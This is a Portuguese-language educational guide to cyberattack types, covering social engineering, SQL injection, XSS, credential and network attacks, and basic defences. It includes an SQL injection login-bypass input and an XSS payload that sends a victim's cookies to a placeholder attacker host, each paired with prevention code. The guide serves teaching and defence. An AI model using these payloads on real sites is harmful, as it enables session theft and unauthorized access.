# ⚔️ Tipos de Ataques Cibernéticos — Guia Completo

> ⚠️ **Aviso Legal**: Este material é exclusivamente para fins educacionais e de defesa. O uso de qualquer técnica descrita aqui sem autorização explícita é crime (Lei 12.737/2012 — Lei Carolina Dieckmann).

## 🎭 1. Engenharia Social

Manipulação psicológica para obter informações ou acesso.

### Tipos:

| Ataque | Descrição | Exemplo |
|--------|-----------|---------|
| **Phishing** | E-mails falsos imitando entidades | "Seu banco precisa verificar seus dados" |
| **Spear Phishing** | Phishing direcionado a alvo específico | CEO fraud |
| **Vishing** | Phishing por voz (telefone) | "Suporte técnico da Microsoft" |
| **Smishing** | Phishing por SMS | Link falso de rastreamento |
| **Pretexting** | Criar uma identidade falsa | "Sou do RH, preciso da sua senha" |
| **Baiting** | Isca física | Pen drive infectado deixado no estacionamento |
| **Tailgating** | Seguir alguém para área restrita | Entrar após funcionário com crachá |

### Indicadores de Phishing:
```
🚩 Urgência excessiva: "Sua conta será bloqueada em 24h!"
🚩 Remetente suspeito: suporte@bancobrasil-seguro.com
🚩 Links encurtados ou com typosquatting: paypa1.com (L→1)
🚩 Solicitação de dados sensíveis por email
🚩 Erros gramaticais e ortográficos
🚩 Anexos inesperados: .exe, .zip, .doc com macros
```

---

## 💉 2. Injeção de Código

### SQL Injection
```sql
-- Input malicioso em formulário de login
-- Campo usuário: admin' --
-- Campo senha: qualquer_coisa

-- Query resultante (vulnerável):
SELECT * FROM usuarios WHERE nome='admin' --' AND senha='qualquer_coisa'
-- O -- comenta o resto, autenticando sem senha!

-- Prevenção: Prepared Statements
SELECT * FROM usuarios WHERE nome = ? AND senha = ?
```

### XSS — Cross-Site Scripting
```html
<!-- Payload XSS em campo de comentário -->
<script>
  document.location = 'https://atacante.com/steal?c=' + document.cookie;
</script>

<!-- Prevenção: sanitizar input e escapar output -->
<!-- Correto em PHP: -->
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

---

## 🔑 3. Ataques a Credenciais

| Ataque | Descrição |
|--------|-----------|
| **Brute Force** | Tenta todas as combinações possíveis |
| **Dictionary Attack** | Usa lista de palavras comuns |
| **Credential Stuffing** | Usa credenciais vazadas de outros sites |
| **Password Spraying** | Uma senha para muitos usuários |
| **Rainbow Table** | Tabela pré-computada de hashes |

### Força de Senhas:
```python
import re

def avaliar_senha(senha):
    pontos = 0
    if len(senha) >= 8: pontos += 1
    if len(senha) >= 12: pontos += 1
    if re.search(r'[A-Z]', senha): pontos += 1
    if re.search(r'[a-z]', senha): pontos += 1
    if re.search(r'[0-9]', senha): pontos += 1
    if re.search(r'[^A-Za-z0-9]', senha): pontos += 1
    
    niveis = ['❌ Muito Fraca', '⚠️ Fraca', '🟡 Razoável',
              '🟠 Boa', '🟢 Forte', '✅ Muito Forte', '🏆 Excelente']
    return niveis[min(pontos, 6)]

print(avaliar_senha("abc"))          # ❌ Muito Fraca
print(avaliar_senha("Eduardo@2024")) # ✅ Muito Forte
```

---

## 🌐 4. Ataques de Rede

| Ataque | Camada OSI | Descrição |
|--------|-----------|-----------|
| **DDoS** | 3-7 | Inunda o alvo com tráfego |
| **MITM** | 2-7 | Intercepta comunicação |
| **ARP Spoofing** | 2 | Falsifica tabela ARP |
| **DNS Spoofing** | 7 | Redireciona resolução DNS |
| **Port Scanning** | 3-4 | Mapeia serviços abertos |
| **Packet Sniffing** | 1-2 | Captura tráfego em texto claro |

---

## 🛡️ 5. Defesas Essenciais

```
✅ FIREWALL: Filtra tráfego por regras
✅ IDS/IPS: Detecta/bloqueia intrusões
✅ WAF: Protege aplicações web
✅ MFA: Autenticação multifator
✅ Patch Management: Atualizar sistemas
✅ Segmentação de rede: Isolar sistemas críticos
✅ Princípio do Menor Privilégio: acesso mínimo necessário
✅ Backup 3-2-1: 3 cópias, 2 mídias, 1 offsite
```
